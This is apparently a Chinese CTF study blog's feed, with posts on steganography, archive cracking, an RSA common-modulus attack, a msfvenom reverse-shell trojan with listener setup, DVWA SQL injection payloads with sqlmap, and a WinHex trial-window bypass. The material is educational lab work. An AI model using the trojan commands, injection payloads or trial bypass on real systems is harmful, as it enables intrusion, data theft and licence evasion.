src="/picture/misc19.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>什么也没有只拿到了Adobe ImageReady，猜测和ps有关，搜了一下</p>    <figure class="figure-image">      <img src="/picture/misc20.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>打开PS<br>[图像]-&gt;[自动色调]<br>即可得到flag</p>    <figure class="figure-image">      <img src="/picture/misc21.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <h2 id="4、stage1"><a href="#4、stage1" class="headerlink" title="4、stage1"></a>4、stage1</h2><p>丢进stegsolve里，很容易就发现二维码</p>    <figure class="figure-image">      <img src="/picture/misc41.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>但是实在Random colour map通道里的，能不能出现，全看运气，我弄了好久才出现一两次，每次你往左一次，再往右，出现的图片颜色不一样了。</p>    <figure class="figure-image">      <img src="/picture/misc42.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>十六进制转文件</p>    <figure class="figure-image">      <img src="/picture/misc43.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>复制到txt文件，导入010editor，导出为pyc文件</p><p>pyc文件反汇编<br>pip install uncompyle  #安装反汇编模块<br>uncompyle6 1.pyc &gt; 111.py</p>    <figure class="figure-image">      <img src="/picture/misc44.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>拿到flag是AlphaLab</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、a-good-idea&quot;&gt;&lt;a href=&quot;#1、a-good-idea&quot; class=&quot;headerlink&quot; title=&quot;1、a_good_idea&quot;&gt;&lt;/a&gt;1、a_good_idea&lt;/h2&gt;&lt;p&gt;先010editor看，右栏Ascii很容易就看到很</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透工具制作木马病毒</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/</id>
    <published>2022-01-11T07:23:16.000Z</published>
    <updated>2022-01-17T08:00:04.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、msfvenom生成远控木马"><a href="#1、msfvenom生成远控木马" class="headerlink" title="1、msfvenom生成远控木马"></a>1、msfvenom生成远控木马</h2><p>msfvenom是用来生成后门软件，在目标机上执行后门，在本地监听上线。(msfvenom在shell里使用，不是在msfconsole终端)</p>    <figure class="figure-image">      <img src="/picture/misc22.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <p>msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.88.123   lport=9999  -f  exe  -o   demo.exe<br>lhost攻击机的地址，lport：1~65535自己任选，不要选已在工作中的端口    </p><p>查询kali的ip地址<br>ifconfig或ip add</p>    <figure class="figure-image">      <img src="/picture/misc23.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc24.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>现在木马就生成好了</p>    <figure class="figure-image">      <img src="/picture/misc25.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>再点击open folder就可以看到demo.exe了</p><h2 id="2、开启监听"><a href="#2、开启监听" class="headerlink" title="2、开启监听"></a>2、开启监听</h2><p>在msfconsole中开启监听，等待受害者运行上钩<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.169.88.123  (注意空格不要多输)<br>set lport 9999<br>run</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、msfvenom生成远控木马&quot;&gt;&lt;a href=&quot;#1、msfvenom生成远控木马&quot; class=&quot;headerlink&quot; title=&quot;1、msfvenom生成远控木马&quot;&gt;&lt;/a&gt;1、msfvenom生成远控木马&lt;/h2&gt;&lt;p&gt;msfvenom是用来生成后</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/11/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/11/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-01-11T06:29:39.000Z</published>
    <updated>2022-01-17T07:59:16.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="判断是否存在SQL注入漏洞"><a href="#判断是否存在SQL注入漏洞" class="headerlink" title="判断是否存在SQL注入漏洞"></a>判断是否存在SQL注入漏洞</h2><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><h2 id="如果利用SQL注入漏洞"><a href="#如果利用SQL注入漏洞" class="headerlink" title="如果利用SQL注入漏洞"></a>如果利用SQL注入漏洞</h2><h5 id="1、判断数据库列数-order-by-column-num"><a href="#1、判断数据库列数-order-by-column-num" class="headerlink" title="1、判断数据库列数  order by [column_num]"></a>1、判断数据库列数  order by [column_num]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><h5 id="2、联合查询其他信息-union-select-sql1-sql2"><a href="#2、联合查询其他信息-union-select-sql1-sql2" class="headerlink" title="2、联合查询其他信息  union select [sql1] [sql2]"></a>2、联合查询其他信息  union select [sql1] [sql2]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><h5 id="3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’"><a href="#3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’" class="headerlink" title="3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’"></a>3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><h5 id="4、联合查询信息-union-query-sql"><a href="#4、联合查询信息-union-query-sql" class="headerlink" title="4、联合查询信息  union [query_sql]"></a>4、联合查询信息  union [query_sql]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p>    <figure class="figure-image">      <img src="/picture/web1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;判断是否存在SQL注入漏洞&quot;&gt;&lt;a href=&quot;#判断是否存在SQL注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;判断是否存在SQL注入漏洞&quot;&gt;&lt;/a&gt;判断是否存在SQL注入漏洞&lt;/h2&gt;&lt;p&gt;SELECT  first_name,last_na</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>RSA共模攻击和gmpy2、libnum常用函数</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</id>
    <published>2022-01-10T07:55:23.000Z</published>
    <updated>2022-01-17T07:59:27.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><p>当两个用户使用相同的模数N、不同的私钥时，加密同一明文消息时，即存在同模攻击</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>设两个用户的公钥分别为e<sub>1</sub>和e<sub>2</sub>，且两者互质。明文信息为m，密文分别为:</p>    <figure class="figure-image">      <img src="/picture/c2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>​    </p><p>当攻击者截获c<sub>1</sub>和c<sub>2</sub>后，就可以恢复出明文。用扩展欧几里得算法求出re<sub>1</sub>+se<sub>2</sub>=1 mod  n 的两个整数r和s，由此可得:</p>    <figure class="figure-image">      <img src="/picture/c3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>                                        <p>​                                </p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2>    <figure class="figure-image">      <img src="/picture/c1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#数字n、c1、c2都太长了，我直接去了</span><br>n=<br>e1= <span class="hljs-number">2333</span><br>e2= <span class="hljs-number">23333</span><br>c1=<br>c2=<br>gcd, s, t = gmpy2.gcdext(e1, e2)<br><span class="hljs-comment">#广义欧几里得求出s,t  gcdext返回值为e1,e2最大公因数和s、t。 s*e1+t*e2=(e1,e2)</span><br><br><span class="hljs-comment">#s和t中必然有一位负数，将其变为正数，要使等式仍然成立，取逆元</span><br><span class="hljs-keyword">if</span> s &lt; <span class="hljs-number">0</span>:<br>    s = -s<br>    c1 = gmpy2.invert(c1, n)<br><span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">0</span>:<br>    t = -t<br>    c2 = gmpy2.invert(c2, n)<br>plain = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(plain))<br><span class="hljs-comment">#将long转换成字符串，是Crypto.Util.number中的方法，这里用不了libnum.n2s(plain)因为plain太长了</span><br></code></pre></td></tr></table></figure><h2 id="gmpy2常用函数"><a href="#gmpy2常用函数" class="headerlink" title="gmpy2常用函数"></a>gmpy2常用函数</h2><ul><li>n=invert(m,phi)求mod phi的逆元 </li><li>pow(m,e,n)求c^d mod n </li><li>gmpy2.is_prime(n) 素性检测</li><li>gmpy2.gcd(a,b)  欧几里得算法，最大公约数 </li><li>gmpy2.gcdext(a,b)  扩展欧几里得算法</li><li>gmpy2.iroot(x,n)  x开n次根</li><li>gmpy2.mpz(n) 初始化一个大整数</li></ul><h2 id="libnum常用函数"><a href="#libnum常用函数" class="headerlink" title="libnum常用函数"></a>libnum常用函数</h2><ul><li><p>libnum.invmod(a,b)   求mod b的逆元</p></li><li><p>数字型（不论是十六进制还是十进制）与字符串之间的转换：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>s=<span class="hljs-string">&quot;flag&#123;pcat&#125;&quot;</span><br><span class="hljs-built_in">print</span> libnum.s2n(s)<br><br><br><span class="hljs-keyword">import</span> libnum<br>n=<span class="hljs-number">0x666c61677b706361747d</span><br><span class="hljs-built_in">print</span> libnum.n2s(n)<br></code></pre></td></tr></table></figure><ul><li> 二进制与字符串之间的转换：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>b=‘01110000011000110110000101110100‘<br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#二进制的位数最好是8的倍数</span><br><br><br><span class="hljs-keyword">import</span> libnum<br>b=‘01110000011000110110000101110100‘<br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#二进制的位数最好是8的倍数</span><br></code></pre></td></tr></table></figure><ul><li>质数&amp;因数分解</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">print</span> libnum.generate_prime(1024)<br><br><span class="hljs-builtin-name">print</span> libnum.factorize(1024)<br></code></pre></td></tr></table></figure><blockquote><p>本篇博客大部分摘自CTFwiki，记录的目的是为了加深自己的理解，也是为了方便自己的使用</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻击条件&quot;&gt;&lt;a href=&quot;#攻击条件&quot; class=&quot;headerlink&quot; title=&quot;攻击条件&quot;&gt;&lt;/a&gt;攻击条件&lt;/h2&gt;&lt;p&gt;当两个用户使用相同的模数N、不同的私钥时，加密同一明文消息时，即存在同模攻击&lt;/p&gt;
&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界simpleRAR</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/</id>
    <published>2022-01-09T11:14:55.000Z</published>
    <updated>2022-01-17T08:00:42.575Z</updated>
    
    <content type="html"><![CDATA[    <figure class="figure-image">      <img src="/picture/misc13.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  拿到压缩包里面只有一个flag.txt内容为flag is not here<p>把压缩包丢入010editor</p>    <figure class="figure-image">      <img src="/picture/misc10.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这是上一篇压缩文件分析中提到的的，有时候给出的RAR文件的头部各个字块会故意给错导致无法识别<br>文件块的第三个字节为类型块，也叫头类型<br>头类型是0x72表示是标记块<br>头类型是0x73表示是压缩文件头块<br>头类型是<font color='red'>0x74</font>表示是文件头块<br>头类型是0x75表示是注释头块</p><p>因为flag.txt文件的内容为flag is not here，所以可以找到下一个文件的文件头，把7A改成74即可看到了secret.png</p>    <figure class="figure-image">      <img src="/picture/misc11.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>查看exif无果，把secret丢入010editor中，文件头是gif类型的，更改后缀名(但其实不更改也可以正常打开，我也不知道为啥)，然后看不出来什么了。</p><p>把图片丢入stegsolve中，更改颜色通道,看到了这个</p>    <figure class="figure-image">      <img src="/picture/misc12.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这里我还在想是不是高度错误了，尝试爆破宽高不知道为什么爆破不出来，不知道是不是因为是gif类型的</p><p>看看题目双图层</p><p>打开Photoshop，果然看到另一个图层保存为png后丢入stegsolve中</p>    <figure class="figure-image">      <img src="/picture/misc14.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>合并就可以得到一张完整的二维码了，这里我发现了一个更方便的方法(因为我之前用ps和ppt试过)，就是用snipaste粘粘到桌面上就行了</p>    <figure class="figure-image">      <img src="/picture/misc9.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
    
    
      
      
    <summary type="html">
    &lt;figure class=&quot;figure-image&quot;&gt;
      &lt;img src=&quot;/picture/misc13.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;
      &lt;figcaption&gt;&lt;/figcaption&gt;
    &lt;/figur</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc压缩文件处理</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/</id>
    <published>2022-01-09T02:24:30.000Z</published>
    <updated>2022-01-17T07:59:39.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、伪加密"><a href="#1、伪加密" class="headerlink" title="1、伪加密"></a>1、伪加密</h2><p>如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过标识符来显示的，在每个文件的文件目录字段有一位专门标识了文件是否加密，将其设置为00表示该文件未加密，如果成功解压则表示文件为伪加密，如果解压出错说明文件为真加密</p><p>操作方法：使用winhex或010editor，找到文件头第九第十个字符，将其修改为0000. (其中50是第一个字符)<br>1、使用winhex打开文件搜索十六进制504B0102，可以看到每个加密文件的文件头字段<br>2、从50开始，第九个第十个字符为加密字段，将其设置为0000即可变为无加密状态<br>3、RAR文件由于有头部检验，使用伪加密时打开文件会出现报错，使用winhex修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，将该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密</p><h2 id="2、破解压缩包密码"><a href="#2、破解压缩包密码" class="headerlink" title="2、破解压缩包密码"></a>2、破解压缩包密码</h2><p>明文攻击指已经知道加密的zip中部分文件的明文内容，利用这些内容推测出密钥并解密zip文件的攻击方法，相比与暴力破解，这种方法在破解密码较为复杂的压缩包时的效率更高</p><p>例如:假设一个加密的压缩包中有两个文件readme.txt和flag.txt，其中flag.txt的内容时我们希望知道的，而我们拥有readme.txt的明文内容，使用上述两个文件可以进行明文攻击<br>1、将readme.txt的明文文件压缩，变成readme1.zip<br>2、打开archpr，攻击类型选择明文，明文文件路径选择readme1.zip<br>(使用该方法要注意：1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致 2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致)</p><h2 id="3、RAR头部故意给错"><a href="#3、RAR头部故意给错" class="headerlink" title="3、RAR头部故意给错"></a>3、RAR头部故意给错</h2><p>有时候给出的RAR文件的头部各个字块会故意给错导致无法识别<br>文件块的第三个字节为类型块，也叫头类型<br>头类型是0x72表示是标记块<br>头类型是0x73表示是压缩文件头块<br>头类型是<font color='red'>0x74</font>表示是文件头块<br>头类型是0x75表示是注释头块</p>    <figure class="figure-image">      <img src="/picture/misc15.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、伪加密&quot;&gt;&lt;a href=&quot;#1、伪加密&quot; class=&quot;headerlink&quot; title=&quot;1、伪加密&quot;&gt;&lt;/a&gt;1、伪加密&lt;/h2&gt;&lt;p&gt;如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过标识符来显示的，在</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc图片隐写</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/08/misc%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/08/misc%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2022-01-08T04:23:05.000Z</published>
    <updated>2022-01-17T07:59:51.246Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、LSB-最低有效位Least-Significant-Bit"><a href="#1、LSB-最低有效位Least-Significant-Bit" class="headerlink" title="1、LSB(最低有效位Least Significant Bit)"></a>1、LSB(最低有效位Least Significant Bit)</h2><p>LSB替换隐写基本思想使用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低位平面组成含隐藏信息的新图形</p><p>例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像素中的最低的1bit。在人眼中看来是看不住来区别的，也把信息隐藏起来了。如：把A转成16进制的0*61在转成二进制的01100001，在修改为红色通道的最低位为这些二进制串。<br>像素三原色(RGB)<br><strong>通过修改像素中最低为的1bit来达到隐藏的效果</strong><br>工具:stegsolve、zsteg、wbstego4(通常用于.bmp和.pdf)、Python脚本</p>    <figure class="figure-image">      <img src="/picture/misc6.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>因为不确定Red、Blue、Green的排列顺序，所以需要依次选择RGB、BGR……</p><p>zsteg(这个方法很厉害)<br>zsteg是一个命令行工具，linux下输入gem install zsteg进行安装<br>使用:zsteg 图片名<br>zsteg会把所有可能情况RGB、BGR……中的文本信息依次显示出来</p><h2 id="2、CRC检验出错"><a href="#2、CRC检验出错" class="headerlink" title="2、CRC检验出错"></a>2、CRC检验出错</h2><p>当PNG文件头正常但无法正常打开文件，可能是CRC校验出错。可以尝试通过TweakPNG打开PNG，会弹处校验错误的提示，比如显示CRC是fe1a5ab6，正确的是b0a7a9f1，打开问winhex或010editor找到CRC值fe1a5ab6将其改为b0a7a9f1</p><h2 id="3、图片高度或宽度错误"><a href="#3、图片高度或宽度错误" class="headerlink" title="3、图片高度或宽度错误"></a>3、图片高度或宽度错误</h2><p>有时CRC没有错误，但是图片的高度或宽度发生了错误，需要通过CRC计算出正确的宽度和高度</p>    <figure class="figure-image">      <img src="/picture/misc7.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>前八个字节89 50 4E <strong>47 0D 0A 1A 0A</strong>为png的文件头，<strong>该段格式是固定的</strong><br>前四个字节<strong>00 00 00 0D</strong>（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，<strong>该段格式是固定的</strong><br>之后的四个字节<strong>49 48 44 52</strong>（即为ASCII码的IHDR）是文件头数据块的标示，<strong>该段格式也是固定的</strong></p><p><font size=3 color='purple'>之后进入13位数据块，前8个字节<strong>00 00 01 69 00 00 03 25</strong>中：前四个字节00 00 01 69代表该图片的宽，<strong>该段数据是由图片的实际宽决定的</strong>，后四个字节00 00 03 25代表该图片的高，<strong>该段数据是由图片的实际高度决定的</strong></font><br>剩余的4位<strong>98 6B 9E 93</strong>为该png的CRC检验码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#crc爆破宽高的脚本</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br>crcbp=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>        data=crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>]+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32=binascii.crc32(data)&amp;<span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc32== <span class="hljs-number">0x00BF122A</span>:  <span class="hljs-comment">#这里的值也需要根据图片的crc值进行更改</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br><br></code></pre></td></tr></table></figure><h2 id="4、图片加密"><a href="#4、图片加密" class="headerlink" title="4、图片加密"></a>4、图片加密</h2><p>Bftools<br>在windows的cmd下，对加密过的图片文件进行解密<br>格式:<br>Bftools.exe  decode  braincopter  要加密的图片名称 -output  输出文件名<br>Bftools.exe  run  上一步输出文件名</p><p>Stegdetect<br>Stegdetect工具探测加密方式，主要用于分析<strong>PEG</strong>文件，因此用stegdetcct用于检测到通过JSteg、JPHide、OutGuess、Invisible Secret、F5、appenddX和Camouflage这些隐写工具隐藏的信息<br>格式：<br>.\stegdetect  xxx.jpg<br>.\stegdetect  -s  敏感度  xxx.jpg<br> .\必不可少<br>  #敏感度最大为10，敏感度越大检测结果越准确，所以一般都是stegdetect  -s 10.0  xxx.jpg      <figure class="figure-image">      <img src="/picture/misc8.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <br>在stegdetect.exe所在位置右键“在Windows终端打开”,因为我下载了PowerShell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、LSB-最低有效位Least-Significant-Bit&quot;&gt;&lt;a href=&quot;#1、LSB-最低有效位Least-Significant-Bit&quot; class=&quot;headerlink&quot; title=&quot;1、LSB(最低有效位Least Significant</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc文件操作</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/07/misc%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E9%9A%90%E5%86%99/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/07/misc%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E9%9A%90%E5%86%99/</id>
    <published>2022-01-07T11:03:46.000Z</published>
    <updated>2022-01-17T07:59:45.181Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件类型识别、取证"><a href="#文件类型识别、取证" class="headerlink" title="文件类型识别、取证"></a>文件类型识别、取证</h2><p>1、file命令<br>当文件没有后缀名或者有后缀名而无法正常打开时，根据识别出的文件类型来修改后缀名即可正常打开文件(在Linux操作系统下使用该命令)<br>格式:  file 文件名</p><p>2、strings命令<br>打印文件中可打印的字符，经常用来发现文件中的一些提示信息或是一些特殊的编码信息，常常用来发现题目的突破口<br>配合grep命令探测指定信息：<br>strings 文件名 | grep -i XXCTF<br>例如：strings webshell.pcapng | grep {      #查找带有{ 的字符串      </p><p>3、十六进制查看器<br>通过winhex、010editor或notepad++可以查看文件头类型，根据文件头类型判断出文件类型</p>    <figure class="figure-image">      <img src="/picture/misc1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p><font size=1 color='red'>winhex试用期已过窗口绕过方法：点击details(详细)，把打开的窗格最小化之后，即可正常使用winhex</font><br><font size=1 color='red'>notepad++查看十六进制需要下载一个HEX-Editor插件</font></p><p>4、文件头残缺/错误<br>通常文件无法正常打开有两种情况，一种是文件头部残缺，另一种是文件头部字段错误。针对文件头部残缺的情况，使用winhex程序添加相应的文件头，支队头部字段错误可以找一个相同类型的文件进行替换<br>一般使用file命令，只显示data，那么就极有可能是文件头残缺或错误</p>    <figure class="figure-image">      <img src="/picture/misc2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <hr><h2 id="文件分离操作"><a href="#文件分离操作" class="headerlink" 